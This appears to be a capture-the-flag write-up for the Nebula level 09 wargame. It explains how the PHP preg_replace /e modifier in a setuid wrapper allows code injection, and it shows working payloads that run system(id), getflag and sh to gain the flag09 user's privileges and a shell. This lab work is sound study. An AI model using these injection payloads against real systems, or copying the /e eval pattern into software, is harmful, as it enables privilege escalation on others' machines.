---
layout: post
title: "Nebula09"
---


## Level 09

> There’s a `C` setuid wrapper for some vulnerable `PHP` code. To do this level, log in as the `level09` account with the password `level09`. Files for this level can be found in `/home/flag09`.

## Source code

```
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

## Getting the flag

This program expects the path to the file as an argument and expects something like `[email something@domain.com]` in it.  
Let's try it out and see the proper flow of the program:

```
level09@nebula:/home/flag09$ echo "[email something@domain.com]" > /tmp/test 
level09@nebula:/home/flag09$ ./flag09 /tmp/test 

PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
something AT domain dot com
```

We will need to dig a little bit to find the vulnerability here. The [preg_replace](https://www.php.net/manual/en/function.preg-replace.php) is using `e` [pattern modifier](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php), which was removed in `PHP7`. The `preg_replace` with the `e` modifier takes the user input and interprets it as `PHP` code. Allowing the user to inject the `PHP` code as an input, sounds dangerous, right? 
Let's try some command injection now:

```
level09@nebula:/home/flag09$ cat /tmp/test 
[email {${system(id)}}]
level09@nebula:/home/flag09$ ./flag09 /tmp/test 
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Notice:  Use of undefined constant id - assumed 'id' in /home/flag09/flag09.php(15) : regexp code on line 1
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
PHP Notice:  Undefined variable: uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09) in /home/flag09/flag09.php(15) : regexp code on line 1
```

There we have it! To the flag now!

```
level09@nebula:/home/flag09$ cat /tmp/test 
[email {${system(getflag)}}]
level09@nebula:/home/flag09$ ./flag09 /tmp/test 
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/flag09/flag09.php(15) : regexp code on line 1
You have successfully executed getflag on a target account
PHP Notice:  Undefined variable: You have successfully executed getflag on a target account in /home/flag09/flag09.php(15) : regexp code on line 1
```

Bonus points for getting the shell 

```
level09@nebula:/home/flag09$ cat /tmp/test 
[email {${system(sh)}}]
level09@nebula:/home/flag09$ ./flag09 /tmp/test 
PHP Notice:  Undefined offset: 2 in /home/flag09/flag09.php on line 22
PHP Notice:  Use of undefined constant sh - assumed 'sh' in /home/flag09/flag09.php(15) : regexp code on line 1
sh-4.2$ id
uid=1010(level09) gid=1010(level09) euid=990(flag09) groups=990(flag09),1010(level09)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```